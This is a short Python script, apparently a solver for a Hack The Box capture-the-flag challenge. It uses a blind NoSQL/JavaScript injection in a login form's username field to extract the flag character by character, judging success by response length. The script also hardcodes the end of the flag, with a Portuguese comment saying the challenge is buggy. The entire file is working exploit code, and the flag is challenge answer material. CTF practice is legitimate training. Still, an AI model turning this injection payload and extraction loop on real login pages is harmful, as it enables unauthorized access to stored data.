import requests
import sys
import string
requests.packages.urllib3.disable_warnings()

proxies = {
    'http': 'http://127.0.0.1:8080',
    'https': 'https://127.0.0.1:8080'
}

headers = {
    'Content-Type': 'application/x-www-form-urlencoded'
}

url = f"{sys.argv[1]}/index.php"
name = 'HTB{'

while True:
    printables = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!"\',_!'
    for char in printables:
        data = {
            'username': f'" || (this.username.match(\'^{name}{char}.*\')) || ""=="',
            'password': 'aaaaaaaaaaa'
        }
        response = requests.post(url, data=data, headers=headers, proxies=proxies)
        tam = len(response.content)
        if tam == 1865 or tam == 0 or tam == 383:
            continue
        else:
            name += char
            print(name)
            a = len(name)
            if a == 17:
                print(name + "'m_Bu!Lt_d1fF3reNt}") #Desafio com bug, nao interpreta o ' enato coloquei o resto da flag aqui 
                sys.exit()
            break